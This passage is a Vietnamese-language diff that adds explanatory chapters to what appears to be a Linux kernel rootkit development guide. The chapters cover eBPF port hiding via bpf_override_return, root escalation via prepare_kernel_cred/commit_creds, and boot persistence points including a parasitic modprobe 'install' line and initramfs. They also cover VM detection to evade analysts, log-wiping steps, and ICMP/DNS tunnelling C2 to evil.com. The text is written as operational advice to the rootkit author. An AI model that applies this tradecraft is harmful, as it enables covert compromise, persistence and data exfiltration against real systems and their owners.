+  │ Kernel 5.15      │     │ Kernel 6.1       │
+  │ struct task_struct│     │ struct task_struct│
+  │   ...            │     │   ...            │
+  │   pid @ offset   │     │   pid @ offset   │
+  │   280             │     │   296 (KHAC!)    │
+  │   ...            │     │   ...            │
+  └──────────────────┘     └──────────────────┘
+  BPF program hardcode offset 280 → CRASH tren 6.1!
+
+Giai phap: BTF + CO-RE
+  ┌────────────────────────────────────────────────────────┐
+  │ CONFIG_DEBUG_INFO_BTF=y (default tren modern distros) │
+  │                                                        │
+  │ BTF = compact type information embedded in kernel      │
+  │ Location: /sys/kernel/btf/vmlinux                      │
+  │                                                        │
+  │ bpftool btf dump file /sys/kernel/btf/vmlinux format c │
+  │ → generates vmlinux.h (ALL kernel struct definitions)  │
+  └────────────────────────────────────────────────────────┘
+
+  CO-RE Flow:
+  ┌───────────────┐    ┌──────────────┐    ┌───────────────┐
+  │ .bpf.c source │    │ Clang + BTF  │    │ BPF ELF with  │
+  │ uses          │───>│ compile with │───>│ CO-RE relocs  │
+  │ BPF_CORE_READ │    │ -g flag      │    │ (field offset │
+  │               │    │              │    │  relocations) │
+  └───────────────┘    └──────────────┘    └───────┬───────┘
+                                                   │
+                                           load time (libbpf)
+                                                   │
+                                                   ▼
+                                    ┌──────────────────────────┐
+                                    │ libbpf reads target      │
+                                    │ kernel BTF, patches      │
+                                    │ field offsets in BPF      │
+                                    │ instructions              │
+                                    │                          │
+                                    │ offset 280 → patched     │
+                                    │ to 296 on kernel 6.1     │
+                                    └──────────────────────────┘
+
+  Ket qua: Code compiled tren kernel 5.15 chay duoc tren 6.1
+           ma KHONG can recompile!
+```
+
+#### 10.0.6 bpf_override_return — Overwrite function return value
+
+```
+bpf_override_return(struct pt_regs *regs, u64 rc):
+
+  Yeu cau BAT BUOC (thieu mot cai = KHONG HOAT DONG):
+  ┌────────────────────────────────────────────────────────┐
+  │ 1. CONFIG_BPF_KPROBE_OVERRIDE=y trong kernel config   │
+  │ 2. Target function annotated voi ALLOW_ERROR_INJECTION│
+  │ 3. Program type = kprobe (KHONG phai fentry/fexit)    │
+  │ 4. Chi hoat dong voi functions return long/int        │
+  └────────────────────────────────────────────────────────┘
+
+  Cach hoat dong:
+  ┌─────────────────────────────────────────────────────┐
+  │ 1. kprobe fires tai function entry                  │
+  │ 2. BPF program goi bpf_override_return(regs, val)  │
+  │ 3. Kernel set pt_regs->ax = val (return value)      │
+  │ 4. Kernel set pt_regs->ip = just past function      │
+  │    prologue (skip function body entirely)           │
+  │ 5. Function NEVER EXECUTES — returns val directly   │
+  └─────────────────────────────────────────────────────┘
+
+  Rootkit use: kprobe tcp4_seq_show → bpf_override_return(ctx, 1)
+               1 = SEQ_SKIP → connection entry khong duoc output
+               → Port an trong /proc/net/tcp
+```
+
+---
 
 ### 10.1 Makefile cho eBPF rootkit
 
@@ -5603,6 +8349,162 @@ cleanup:
 
 ## Chapter 11: Privilege Escalation
 
+### 11.0 Linux Credential Model — Hieu uid/gid/capabilities
+
+Privilege escalation trong kernel rootkit la qua trinh thay doi credential structures cua process hien tai de co quyen root. Hieu credential model cua Linux la nen tang de hieu tai sao privesc tu kernel space lai "trivial".
+
+#### 11.0.1 UID Types — Moi process co 4 bo UID
+
+Moi process trong Linux co 4 loai UID (va tuong tu 4 loai GID), moi loai phuc vu muc dich khac nhau:
+
+```
+Credential Types trong struct cred (include/linux/cred.h):
+
+  ┌─────────────────┬──────────────────────────────────────────────┐
+  │ real uid (ruid)  │ Ai SO HUU process nay.                     │
+  │                  │ Set tai fork() time, ke thua tu parent.     │
+  │                  │ Chi root moi thay doi duoc (setuid()).       │
+  ├─────────────────┼──────────────────────────────────────────────┤
+  │ effective uid    │ Dung cho MOI permission check.              │
+  │ (euid)           │ Khi process mo file, gui signal, etc.       │
+  │                  │ setuid binary thay doi euid (khong phai     │
+  │                  │ ruid) de tam thoi co quyen.                 │
+  ├─────────────────┼──────────────────────────────────────────────┤
+  │ saved uid (suid) │ Luu gia tri euid truoc khi thay doi.       │
+  │                  │ Cho phep seteuid() restore ve gia tri cu.   │
+  │                  │ Vi du: program drop privileges tam thoi     │
+  │                  │ roi restore lai khi can.                    │
+  ├─────────────────┼──────────────────────────────────────────────┤
+  │ filesystem uid   │ Dung RIENG cho file access checks.         │
+  │ (fsuid)          │ Thuong = euid (Linux-specific, rare case    │
+  │                  │ can set khac: NFS server impersonation).    │
+  └─────────────────┴──────────────────────────────────────────────┘
+
+  Setuid binary flow (vi du: /usr/bin/passwd):
+  ┌──────────────────────────────────────────────────────────────┐
+  │ User "alice" (uid=1000) chay /usr/bin/passwd (owned by root)│
+  │                                                              │
+  │ Truoc execve:  ruid=1000, euid=1000, suid=1000              │
+  │ Sau execve:    ruid=1000, euid=0,    suid=0                 │
+  │                           ^^^^                               │
+  │              euid = 0 (root) vi file co setuid bit           │
+  │              → passwd co quyen write /etc/shadow             │
+  └──────────────────────────────────────────────────────────────┘
+```
+
+#### 11.0.2 struct cred — Credential structure trong kernel
+
+```
+struct cred (kernel/cred.c):
+  ┌──────────────────────────────────────────────────────────┐
+  │ atomic_t usage          (reference count)                │
+  │ kuid_t uid, euid, suid, fsuid    (4 UIDs)               │
+  │ kgid_t gid, egid, sgid, fsgid    (4 GIDs)               │
+  │ kernel_cap_t cap_effective        (effective capabilities)│
+  │ kernel_cap_t cap_permitted        (permitted capabilities)│
+  │ kernel_cap_t cap_inheritable      (inheritable caps)     │
+  │ kernel_cap_t cap_bset             (bounding set)         │
+  │ kernel_cap_t cap_ambient          (ambient caps)         │
+  │ struct user_struct *user          (user accounting)      │
+  │ struct user_namespace *user_ns    (user namespace)       │
+  │ struct group_info *group_info     (supplementary groups) │
+  │ void *security                    (LSM security blob)    │
+  └──────────────────────────────────────────────────────────┘
+
+  QUAN TRONG: struct cred duoc quan ly boi RCU (Read-Copy-Update).
+  Kernel KHONG sua truc tiep current->cred.
+  Thay vao do, no copy → modify copy → swap atomically.
+```
+
+#### 11.0.3 Privilege Escalation Flow — prepare_kernel_cred + commit_creds
+
+```
+  prepare_kernel_cred(NULL)
+    │
+    │  1. Allocates new struct cred (kmalloc)
+    │  2. Tham so NULL → copy tu init_cred (PID 1 credentials)
+    │     init_cred = {
+    │       uid = 0, gid = 0           (root)
+    │       cap_effective = FULL        (all 41 capabilities)
+    │       cap_permitted = FULL
+    │       cap_inheritable = FULL
+    │       cap_bset = FULL
+    │       cap_ambient = FULL
+    │     }
+    │  3. Return new_cred voi uid=0, gid=0, ALL capabilities
+    │
+    ▼
+  commit_creds(new_cred)
+    │
+    │  1. rcu_assign_pointer(current->cred, new_cred)
+    │     → Atomic swap, readers (permission checks) thay new cred
+    │  2. old_cred duoc scheduled cho RCU free
+    │     → Sau grace period, kfree(old_cred)
+    │  3. Process la ROOT ngay lap tuc
+    │
+    ▼
+  Process now has uid=0, full capabilities
+
+  CANH BAO voi prepare_kernel_cred(NULL):
+  ┌──────────────────────────────────────────────────────┐
+  │ Neu kmalloc FAIL → return NULL                       │
+  │ commit_creds(NULL) → NULL pointer dereference        │
+  │ → KERNEL PANIC                                       │
+  │                                                      │
+  │ LUON CHECK: if (!new_cred) return;                   │
+  └──────────────────────────────────────────────────────┘
+```
+
+#### 11.0.4 Linux Capabilities — Fine-grained privileges
+
+Linux capabilities chia nho "root power" thanh 41 capabilities rieng biet. Moi capability kiem soat mot nhom operations cu the:
+
+```
+Capability              Gia tri   Mo ta
+─────────────────────────────────────────────────────────────────
+CAP_SYS_ADMIN           21        "God mode" — catch-all admin
+                                  capability. mount, swapon,
+                                  quotactl, sethostname, etc.
+                                  BPF program load can cap nay.
+
+CAP_NET_RAW             13        Su dung raw sockets va packet
+                                  sockets. Can cho ICMP (ping),
+                                  network sniffing.
+
+CAP_SYS_MODULE          16        Load va unload kernel modules.
+                                  insmod, rmmod, init_module().
+                                  Rootkit can cap nay de tu load.
+
+CAP_SYS_PTRACE          19        Trace BAT KY process nao
+                                  (khong chi child). Doc/ghi
+                                  memory cua process khac.
+
+CAP_DAC_OVERRIDE         1        Bypass ALL file permission
+                                  checks (read, write, execute).
+                                  Tuong duong "ignore rwx bits".
+
+CAP_NET_ADMIN            12       Network configuration: ifconfig,
+                                  route, iptables, socket options.
+
+CAP_SETUID               7        Thay doi process UIDs (setuid,
+                                  setreuid, setresuid).
+
+CAP_SYS_RAWIO            17       Raw I/O port access (iopl,
+                                  ioperm). Direct hardware access.
+
+  Capability sets per process:
+  ┌──────────────────────────────────────────────────────────┐
+  │ Effective   = dang duoc su dung cho permission checks    │
+  │ Permitted   = cap upper bound — effective <= permitted   │
+  │ Inheritable = duoc ke thua qua execve()                  │
+  │ Bounding    = limit cho cap co the gain qua execve()     │
+  │ Ambient     = auto-raise vao effective sau execve()      │
+  │               (khong can setuid binary)                  │
+  └──────────────────────────────────────────────────────────┘
+```
+
+---
+
 ```c
 /* privesc.c — Tất cả phương pháp escalate privilege từ kernel
  *
@@ -5693,6 +8595,202 @@ static void privesc_dkom(void)
 # Part III — Operations & Infrastructure
 
 ## Chapter 12: Persistence
+
+### 12.0 Linux Boot Process — Tu power-on toi rootkit load
+
+De hieu persistence mechanisms, truoc tien phai hieu Linux boot process — chuoi cac buoc tu luc nhan nut nguon toi khi rootkit module duoc load vao kernel.
+
+#### 12.0.1 Boot Sequence — Complete timeline
+
+```
+  ┌─────────────────────────────────────────────────────────────────┐
+  │                     FIRMWARE PHASE                              │
+  ├─────────────────────────────────────────────────────────────────┤
+  │                                                                 │
+  │  Power On                                                       │
+  │     │                                                           │
+  │     ▼                                                           │
+  │  BIOS/UEFI POST (Power-On Self Test)                           │
+  │     │  - Hardware initialization                                │
+  │     │  - Memory detection                                       │
+  │     │  - Boot device enumeration                                │
+  │     ▼                                                           │
+  │  Boot Device Selection                                          │
+  │     │  BIOS: MBR (sector 0, 512 bytes)                         │
+  │     │  UEFI: ESP (EFI System Partition, FAT32)                 │
+  │     ▼                                                           │
+  ├─────────────────────────────────────────────────────────────────┤
+  │                    BOOTLOADER PHASE                              │
+  ├─────────────────────────────────────────────────────────────────┤
+  │                                                                 │
+  │  GRUB / systemd-boot / rEFInd                                  │
+  │     │  1. Load vmlinuz (compressed kernel image)               │
+  │     │  2. Load initramfs (initial RAM filesystem)              │
+  │     │  3. Pass kernel command line parameters                  │
+  │     │  4. Jump to kernel entry point                           │
+  │     ▼                                                           │
+  ├─────────────────────────────────────────────────────────────────┤
+  │                     KERNEL PHASE                                │
+  ├─────────────────────────────────────────────────────────────────┤
+  │                                                                 │
+  │  startup_64 (arch/x86/boot/compressed/head_64.S)              │
+  │     │  - Kernel decompresses itself                            │
+  │     ▼                                                           │
+  │  start_kernel() (init/main.c)                                  │
+  │     │                                                           │
+  │     ├── setup_arch()           Architecture-specific setup     │
+  │     ├── mm_init()              Memory management init          │
+  │     ├── sched_init()           Scheduler init                  │
+  │     ├── early_irq_init()       Interrupt init                  │
+  │     ├── init_timers()          Timer subsystem                 │
+  │     ├── console_init()         Console output                  │
+  │     │                                                           │
+  │     └── rest_init()                                            │
+  │          │                                                      │
+  │          └── kernel_init() [kernel thread, PID 1]              │
+  │               │                                                 │
+  │               ├── kernel_init_freeable()                       │
+  │               │    │                                            │
+  │               │    ├── do_initcalls()                           │
+  │               │    │   │                                        │
+  │               │    │   │  Goi TAT CA built-in module init()    │
+  │               │    │   │  Theo thu tu priority levels:          │
+  │               │    │   │  0: early    3: subsys   6: late      │
+  │               │    │   │  1: core     4: fs       7: (unused)  │
+  │               │    │   │  2: postcore 5: device                │
+  │               │    │   │                                        │
+  │               │    │   └── ← BUILT-IN modules init here        │
+  │               │    │                                            │
+  │               │    └── prepare_namespace()                     │
+  │               │         │                                       │
+  │               │         └── Mount REAL root filesystem          │
+  │               │              (switch tu initramfs)              │
+  │               │                                                 │
+  │               └── run_init_process("/sbin/init") ← PID 1      │
+  │                                                                 │
+  ├─────────────────────────────────────────────────────────────────┤
+  │                    USERSPACE PHASE (systemd)                    │
+  ├─────────────────────────────────────────────────────────────────┤
+  │                                                                 │
+  │  systemd (PID 1)                                                │
+  │     │                                                           │
+  │     ├── Read /etc/modules-load.d/*.conf                        │
+  │     │   └── ← ROOTKIT PERSISTENCE POINT 1                     │
+  │     │        systemd-modules-load.service modprobe modules     │
+  │     │                                                           │
+  │     ├── Process udev rules (/etc/udev/rules.d/)               │
+  │     │   └── ← ROOTKIT PERSISTENCE POINT 2                     │
+  │     │        udev rule triggers modprobe on device event       │
+  │     │                                                           │
+  │     ├── Start systemd services                                 │
+  │     │   └── ← ROOTKIT PERSISTENCE POINT 3                     │
+  │     │        Custom .service file runs modprobe                │
+  │     │                                                           │
+  │     └── Multi-user target reached (login prompt)               │
+  │                                                                 │
+  └─────────────────────────────────────────────────────────────────┘
+```
+
+#### 12.0.2 Module Autoloading Mechanism
+
+Kernel modules co the duoc load tu dong thong qua nhieu co che. Hieu cac co che nay giup rootkit chon diem persistence phu hop:
+
+```
+  Module Request Flow:
+
+  Something triggers module request
+  (vi du: mount filesystem, open device, network protocol)
+        │
+        ▼
+  request_module("module_name")          (kernel/kmod.c)
+        │
+        ▼
+  call_modprobe()
+        │
+        ▼
+  call_usermodehelper("/sbin/modprobe", argv, envp, UMH_WAIT_PROC)
+        │
+        │  Kernel spawns userspace process!
+        │  Process chay voi uid=0 (root)
+        ▼
+  /sbin/modprobe "module_name"
+        │
+        ├── Doc /etc/modprobe.d/*.conf
+        │   │
+        │   ├── Check "install" directives
+        │   │   └── ← ROOTKIT PERSISTENCE POINT (parasitic)
+        │   │        "install e1000 insmod rootkit.ko; modprobe ..."
+        │   │
+        │   ├── Check "alias" directives
+        │   │   └── Map alias → real module name
+        │   │
+        │   └── Check "options" directives
+        │       └── Default module parameters
+        │
+        ├── Doc /lib/modules/$(uname -r)/modules.dep
+        │   │
+        │   │  modules.dep = dependency graph
+        │   │  Generated by depmod -a
+        │   │  Format: module.ko: dep1.ko dep2.ko
+        │   │
+        │   └── Load dependencies TRUOC, roi load target module
+        │
+        └── init_module() syscall (hoac finit_module)
+            │
+            └── Kernel loads .ko file → calls module_init()
+
+  depmod va modules.dep:
+  ┌──────────────────────────────────────────────────────┐
+  │ depmod -a                                            │
+  │   Scan /lib/modules/$(uname -r)/                    │
+  │   Build modules.dep (dependency map)                 │
+  │   Build modules.alias (device → module mapping)      │
+  │   Build modules.symbols (exported symbols)           │
+  │                                                      │
+  │ Rootkit PHAI chay depmod sau khi copy .ko vao        │
+  │ /lib/modules/ de modprobe tim thay no.               │
+  └──────────────────────────────────────────────────────┘
+```
+
+#### 12.0.3 initramfs — Early boot rootkit loading
+
+```
+  initramfs (Initial RAM Filesystem):
+  ┌────────────────────────────────────────────────────────────┐
+  │ - CPIO archive (khong phai filesystem image)              │
+  │ - Duoc load vao RAM boi bootloader (GRUB)                 │
+  │ - Mount nhu tmpfs (in-memory filesystem)                  │
+  │ - Chua essential drivers + scripts cho early boot         │
+  │ - Can thiet khi root filesystem tren LVM, RAID, NFS,     │
+  │   encrypted disk, etc.                                    │
+  │                                                            │
+  │ Generated by:                                              │
+  │   Debian/Ubuntu: update-initramfs / mkinitramfs            │
+  │   RHEL/Fedora:   dracut                                    │
+  │   Arch:          mkinitcpio                                │
+  │                                                            │
+  │ Location: /boot/initramfs-$(uname -r).img                 │
+  │           /boot/initrd.img-$(uname -r)                    │
+  └────────────────────────────────────────────────────────────┘
+
+  Rootkit trong initramfs:
+  ┌──────────────────────────────────────────────────────────────┐
+  │ Uu diem:                                                     │
+  │   - Load TRUOC real rootfs mount                             │
+  │   - Load TRUOC bat ky security tool nao                      │
+  │   - initramfs it khi bi inspect boi admins                   │
+  │   - Survive rootfs integrity checks (vi rootkit khong        │
+  │     nam tren rootfs luc check)                               │
+  │                                                              │
+  │ Nhuoc diem:                                                  │
+  │   - Phai rebuild initramfs (can root access)                 │
+  │   - Kernel update co the overwrite initramfs                 │
+  │     (giai phap: hook update-initramfs command)               │
+  │   - Secure Boot co the verify initramfs signature            │
+  └──────────────────────────────────────────────────────────────┘
+```
+
+---
 
 ```c
 /* persistence.c — 7 phương pháp persist rootkit qua reboot
@@ -5979,6 +9077,172 @@ void rk_install_persistence(void)
 ---
 
 ## Chapter 13: Anti-Forensics & Self-Protection
+
+### 13.0 Anti-Forensics Internals — Kernel subsystems to abuse
+
+Anti-forensics trong kernel rootkit lam dung cac kernel subsystems de chong phan tich, xoa dau vet, va tu bao ve. Phan nay giai thich internals cua cac subsystems bi lam dung.
+
+#### 13.0.1 CPUID Instruction — VM/Hypervisor detection
+
+CPUID la x86 instruction cho phep query CPU features. Hypervisors PHAI expose su hien dien cua chung qua CPUID de guest OS hoat dong dung:
+
+```
+CPUID Detection Flow:
+
+  ┌──────────────────────────────────────────────────────────┐
+  │ CPUID voi EAX = 1 (Basic CPU Info)                       │
+  │                                                          │
+  │ Ket qua: ECX bit 31 = Hypervisor Present Bit             │
+  │   0 = bare metal (hoac hypervisor an bit nay)            │
+  │   1 = running inside hypervisor                          │
+  │                                                          │
+  │ Code: cpuid(1, &eax, &ebx, &ecx, &edx);                │
+  │       bool vm = (ecx >> 31) & 1;                         │
+  └──────────────────────────────────────────────────────────┘
+
+  ┌──────────────────────────────────────────────────────────┐
+  │ CPUID voi EAX = 0x40000000 (Hypervisor Vendor)          │
+  │                                                          │
+  │ Ket qua: EBX:ECX:EDX = 12-byte vendor string            │
+  │ (Luu y: thu tu la EBX:ECX:EDX, KHONG phai EBX:EDX:ECX) │
+  │                                                          │
+  │ Vendor Strings:                                          │
+  │ ┌────────────────┬──────────────────────┐                │
+  │ │ "KVMKVMKVM\0\0\0" │ KVM                │                │
+  │ │ "VMwareVMware"   │ VMware              │                │
+  │ │ "Microsoft Hv"   │ Hyper-V             │                │
+  │ │ "XenVMMXenVMM"   │ Xen                 │                │
+  │ │ "VBoxVBoxVBox"   │ VirtualBox          │                │
+  │ │ "TCGTCGTCGTCG"   │ QEMU (TCG mode)     │                │
+  │ │ "bhyve bhyve "   │ bhyve (FreeBSD)     │                │
+  │ └────────────────┴──────────────────────┘                │
+  │                                                          │
+  │ EAX return = max hypervisor CPUID leaf supported         │
+  └──────────────────────────────────────────────────────────┘
+
+  Anti-detection luu y:
+  ┌──────────────────────────────────────────────────────────┐
+  │ Nhieu production servers chay trong VM (AWS EC2, GCP,    │
+  │ Azure VM). Neu rootkit EXIT khi detect VM → mat target.  │
+  │                                                          │
+  │ Strategy dung: THAY DOI BEHAVIOR khi detect VM,          │
+  │ KHONG exit/crash (vi do cung la indicator cho analyst).  │
+  │   - Disable aggressive features                          │
+  │   - Giu passive monitoring only                          │
+  │   - Reduce logging/network activity                      │
+  └──────────────────────────────────────────────────────────┘
+```
+
+#### 13.0.2 Kernel Timer va Workqueue Internals
+
+Rootkit dung timers va workqueues cho periodic tasks (watchdog, self-check, delayed actions). Hieu co che nay giup hieu code trong watchdog_fn va self-protection:
+
+```
+  Kernel Timers va Jiffies:
+  ┌──────────────────────────────────────────────────────────┐
+  │ Jiffies = kernel tick counter (unsigned long)             │
+  │   - Increment moi HZ lAN/giay                            │
+  │   - HZ = 250 (default) hoac 1000 (low-latency config)   │
+  │   - 1 jiffy = 1/HZ giay = 4ms (HZ=250) hoac 1ms        │
+  │                                                          │
+  │ Conversion:                                              │
+  │   msecs_to_jiffies(5000)  = 5 seconds in jiffies         │
+  │   HZ * 30                 = 30 seconds in jiffies        │
+  │   jiffies_to_msecs(j)     = convert back to milliseconds │
+  └──────────────────────────────────────────────────────────┘
+
+  Delayed Work (workqueue):
+  ┌──────────────────────────────────────────────────────────┐
+  │ DECLARE_DELAYED_WORK(name, func)                         │
+  │   → Compile-time declaration cua delayed work item       │
+  │                                                          │
+  │ schedule_delayed_work(&work, delay_jiffies)              │
+  │   → queue_delayed_work(system_wq, &work, delay)          │
+  │     → Internal timer set cho delay jiffies               │
+  │     → Khi timer fires:                                   │
+  │        work function chay trong PROCESS CONTEXT           │
+  │        (co the sleep! khac voi timer callback)           │
+  │                                                          │
+  │ system_wq = kernel's default workqueue                   │
+  │   Threads: kworker/CPU:ID                                │
+  │   Rootkit dung ten "kworker/0:1" de disguise threads    │
+  └──────────────────────────────────────────────────────────┘
+
+  Process context vs Interrupt context:
+  ┌──────────────┬───────────────────┬───────────────────────┐
+  │              │ Process context   │ Interrupt context     │
+  ├──────────────┼───────────────────┼───────────────────────┤
+  │ Sleep?       │ YES (can sleep)   │ NO (must not sleep)   │
+  │ schedule()?  │ YES               │ NO                    │
+  │ Allocate?    │ GFP_KERNEL ok     │ GFP_ATOMIC only       │
+  │ Access user? │ copy_to/from_user │ NO                    │
+  │ Preemptible? │ YES               │ NO                    │
+  │ Example      │ workqueue func,   │ timer callback,       │
+  │              │ kthread, syscall  │ IRQ handler, softirq  │
+  └──────────────┴───────────────────┴───────────────────────┘
+
+  schedule_timeout_interruptible(delay):
+    - Sleep cho delay jiffies
+    - Wake up TRUOC han neu co signal (kthread_stop gui signal)
+    - Return: so jiffies con lai (0 neu het timeout)
+    - Dung cho watchdog: sleep 30*HZ, check, lap lai
+```
+
+#### 13.0.3 Kernel Log System — printk va ring buffer
+
+```
+  Kernel Logging Pipeline:
+
+  printk("rk: module loaded\n")
+       │
+       ▼
+  log_buf (ring buffer trong kernel memory)
+  ┌──────────────────────────────────────────────┐
+  │ Ring buffer, default size: __LOG_BUF_LEN     │
+  │ (256KB default, configurable via log_buf_len │
+  │  kernel parameter)                           │
+  │                                              │
+  │ Structure: moi entry co:                     │
+  │   - timestamp (nanoseconds)                  │
+  │   - log level (0-7, KERN_EMERG..KERN_DEBUG) │
+  │   - facility                                 │
+  │   - message text                             │
+  │   - sequence number (monotonic)              │
+  │                                              │
+  │ Ring behavior: khi FULL → overwrite entries  │
+  │ cu nhat (FIFO eviction)                      │
+  └──────────┬────────────────┬──────────────────┘
+             │                │
+      ┌──────┘                └──────┐
+      ▼                              ▼
+  /dev/kmsg                     /proc/kmsg
+  (structured read,             (blocking read,
+   seekable, per-read           legacy interface,
+   metadata)                    consumed on read)
+      │                              │
+      ▼                              ▼
+  systemd-journald              klogd/syslog
+  → /var/log/journal/           → /var/log/kern.log
+                                → /var/log/syslog
+
+  dmesg command:
+    dmesg = doc /dev/kmsg (modern) hoac syslog() syscall
+    dmesg -C = clear ring buffer (SYSLOG_ACTION_CLEAR)
+    dmesg -n 1 = set console log level (chi show EMERG)
+
+  Rootkit co the:
+  ┌──────────────────────────────────────────────────────────┐
+  │ 1. Clear buffer: dmesg -C (xoa vet "module loaded")     │
+  │ 2. Hook syslog() syscall: filter output cho userspace   │
+  │ 3. Hook printk: prevent logging tu ban dau              │
+  │ 4. Modify log_buf truc tiep: edit/remove entries        │
+  │ 5. Set console loglevel cao: suppress kernel messages   │
+  │ 6. Truncate log files: /var/log/kern.log, auth.log      │
+  │ 7. journalctl --vacuum: xoa journal entries              │
+  └──────────────────────────────────────────────────────────┘
+```
+
+---
 
 ```c
 /* anti_forensics.c — Chống phân tích và tự bảo vệ
@@ -6353,6 +9617,341 @@ static asmlinkage long hooked_delete_module(const struct pt_regs *regs)
 ---
 
 ## Chapter 14: Covert Communication & C2
+
+### 14.0 Protocol Internals — ICMP, DNS, TCP deep dive
+
+C2 (Command and Control) channels cua rootkit su dung cac network protocols de giao tiep voi attacker's server. Hieu cau truc cua cac protocol nay la nen tang de hieu tai sao chung duoc chon va cach rootkit nhung data vao traffic hop phap.
+
+#### 14.0.1 ICMP Packet Format (RFC 792)
+
+ICMP (Internet Control Message Protocol) duoc thiet ke cho network diagnostics (ping, traceroute). Firewall THUONG cho ICMP qua, va ICMP Echo Request/Reply co PAYLOAD FIELD cho phep nhung data tuy y:
+
+```
+  ICMP Echo Request/Reply Packet:
+
+  ┌─────────────────────────────────────────────────────────────┐
+  │                    IP Header (20 bytes)                      │
+  │  Version│IHL│TOS│Total Len│ID│Flags│Frag│TTL│Proto=1│Chksum│
+  │  Src IP │ Dst IP                                            │
+  ├─────────────────────────────────────────────────────────────┤
+  │                   ICMP Header (8 bytes)                      │
+  │                                                             │
+  │  ┌──────────┬──────────┬─────────────────────────────────┐  │
+  │  │ Type (8) │ Code (8) │       Checksum (16)             │  │
+  │  ├──────────┴──────────┼─────────────────────────────────┤  │
+  │  │   Identifier (16)   │     Sequence Number (16)        │  │
+  │  ├─────────────────────┴─────────────────────────────────┤  │
+  │  │                                                       │  │
+  │  │              Data / Payload                           │  │
+  │  │         (variable length, max ~65507 bytes)           │  │
+  │  │                                                       │  │
+  │  │    ← ROOTKIT NHUNG C2 DATA O DAY                     │  │
+  │  │                                                       │  │
+  │  └───────────────────────────────────────────────────────┘  │
+  └─────────────────────────────────────────────────────────────┘
+
+  ICMP Types su dung:
+  ┌──────┬────────────────────┬──────────────────────────────┐
+  │ Type │ Ten                │ Rootkit use                  │
+  ├──────┼────────────────────┼──────────────────────────────┤
+  │  8   │ Echo Request       │ Outbound: exfil data trong   │
+  │      │                    │ payload, gui toi C2 server   │
+  │  0   │ Echo Reply         │ Inbound: nhan commands tu    │
+  │      │                    │ C2 server trong reply payload│
+  └──────┴────────────────────┴──────────────────────────────┘
+
+  Checksum calculation:
+    ICMP checksum covers TOAN BO ICMP message (header + data).
+    Algorithm: 16-bit one's complement of one's complement sum.
+    icmp->checksum = 0;
+    icmp->checksum = ip_compute_csum(packet, total_len);
+
+  Tai sao ICMP tunnel hieu qua:
+    - Firewall allow ICMP (can cho network diagnostics)
+    - IDS thay "ping" → low priority alert
+    - Payload size bien thien (32-1400 bytes) → hard to signature
+    - Identifier field dung lam channel marker (0x1337)
+    - ping -s 1400 (1400 byte payload) la HOAN TOAN HOP PHAP
+```
+
+#### 14.0.2 DNS Packet Format (RFC 1035)
+
+DNS traffic HOAN TOAN KHONG BI BLOCK (essential service). Rootkit encode data trong subdomain labels cua DNS queries:
+
+```
+  DNS Packet Structure:
+
+  ┌─── Header (12 bytes) ──────────────────────────────────────┐
+  │                                                             │
+  │  ┌──────────────┬──────────────────────────────────────┐   │
+  │  │   ID (16)    │           Flags (16)                 │   │
+  │  ├──────────────┼──────────────────────────────────────┤   │
+  │  │  QD Count    │         AN Count (16)                │   │
+  │  │  (16)        │                                      │   │
+  │  ├──────────────┼──────────────────────────────────────┤   │
+  │  │  NS Count    │         AR Count (16)                │   │
+  │  │  (16)        │                                      │   │
+  │  └──────────────┴──────────────────────────────────────┘   │
+  │                                                             │
+  │  Flags bits:                                                │
+  │    QR(1)=query/response  OPCODE(4)  AA(1) TC(1) RD(1)     │
+  │    RA(1) Z(3) RCODE(4)                                     │
+  │                                                             │
+  ├─── Question Section ───────────────────────────────────────┤
+  │                                                             │
+  │  QNAME: Label-encoded domain name                          │
+  │    www.google.com → [3]www[6]google[3]com[0]               │
+  │                      ^len ^label           ^root           │
+  │                                                             │
+  │    Encoding rules:                                          │
+  │    - Moi label bat dau voi length byte                     │
+  │    - Max 63 bytes per label                                │
+  │    - Max 253 bytes total domain name                       │
+  │    - Terminated boi null byte (root label)                 │
+  │                                                             │
+  │  QTYPE (16): Record type (A=1, AAAA=28, TXT=16, etc.)    │
+  │  QCLASS (16): Class (IN=1 for Internet)                    │
+  │                                                             │
+  ├─── Answer Section ─────────────────────────────────────────┤
+  │                                                             │
+  │  NAME: domain name (often pointer: 0xC0 + offset)         │
+  │  TYPE (16)  │  CLASS (16)  │  TTL (32)                    │
+  │  RDLENGTH (16)  │  RDATA (variable)                       │
+  │                                                             │
+  │  TXT Record RDATA:                                         │
+  │    [txt_length][text_data...]                               │
+  │    ← C2 server tra commands trong TXT record RDATA         │
+  │                                                             │
+  └─────────────────────────────────────────────────────────────┘
+
+  DNS Tunneling Data Flow:
+
+  ┌─────────────┐                          ┌──────────────────┐
+  │   Rootkit    │                          │   C2 Server      │
+  │  (infected   │                          │  (authoritative  │
+  │   host)      │                          │   DNS for        │
+  │              │                          │   evil.com)      │
+  └──────┬───────┘                          └────────┬─────────┘
+         │                                           │
+         │  1. DNS Query: hex_data.evil.com          │
+         │  ────────────────────────────────────────> │
+         │     Data = hex-encoded in subdomain        │
+         │     Max ~180 bytes per query               │
+         │     (63-char label * 3 labels - overhead)  │
+         │                                           │
+         │  2. DNS Response: TXT record               │
+         │  <──────────────────────────────────────── │
+         │     Command = text in TXT RDATA            │
+         │     Max ~255 bytes per TXT record          │
+         │                                           │
+
+  Tai sao DNS tunnel:
+    - DNS LUON duoc allow (essential service)
+    - Di qua proxy/firewall
+    - Corporate DNS resolvers forward query toi C2's authoritative NS
+    - Low bandwidth nhung stealth CAO
+    - SUNBURST (SolarWinds) da su dung DNS tunneling
+```
+
+#### 14.0.3 TCP Options — Passive data exfiltration
+
+TCP header va options chua nhieu fields co the bi lam dung de nhung data ma khong thay doi application-layer traffic:
+
+```
+  TCP Header (20 bytes minimum, up to 60 with options):
+
+  ┌─────────────────────────────────────────────────────────────┐
+  │  ┌────────────────────┬────────────────────┐               │
+  │  │ Source Port (16)   │ Dest Port (16)     │               │
+  │  ├────────────────────┴────────────────────┤               │
+  │  │           Sequence Number (32)           │  ← ISN       │
+  │  │                                          │  steganography│
+  │  ├──────────────────────────────────────────┤               │
+  │  │         Acknowledgment Number (32)       │               │
+  │  ├────┬──────┬──────┬──────────────────────┤               │
+  │  │Data│Rsvd  │Flags │    Window (16)        │               │
+  │  │Off │(4)   │(8)   │                      │               │
+  │  │(4) │      │FSRPAU│                      │               │
+  │  ├────┴──────┴──────┼──────────────────────┤               │
+  │  │  Checksum (16)   │ Urgent Pointer (16)  │               │
+  │  ├──────────────────┴──────────────────────┤               │
+  │  │         Options (variable, 0-40 bytes)   │               │
+  │  └──────────────────────────────────────────┘               │
+  └─────────────────────────────────────────────────────────────┘
+
+  TCP Options Format:
